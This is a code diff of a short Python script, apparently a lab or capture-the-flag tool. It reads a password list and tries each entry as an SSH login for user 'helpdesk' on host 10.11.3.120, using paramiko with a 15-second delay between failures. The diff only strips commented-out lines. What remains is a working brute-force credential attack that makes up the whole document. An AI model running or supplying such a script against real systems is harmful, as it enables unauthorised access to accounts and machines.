@@ -3,7 +3,6 @@ import time
 
 
 def sshlogin(password):
-    #urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     host = '10.11.3.120'
     port = 22
     username = 'helpdesk'
@@ -12,20 +11,15 @@ def sshlogin(password):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect(host, port, username, password)
-    #stdin, stdout, stderr = ssh.exec_command('ls')
-    #print (stdout.readlines())
-
 
 file = open("passwords.txt", "r") 
 passwords = file.read().split("\n")
-nopes = []
 client = paramiko.SSHClient()
 for item in passwords:
     try:
         login = sshlogin(item)
     except paramiko.AuthenticationException:
         print(item+ ' = nope')
-        #nopes.append(item)
         client.close()
         time.sleep(15)
     else:
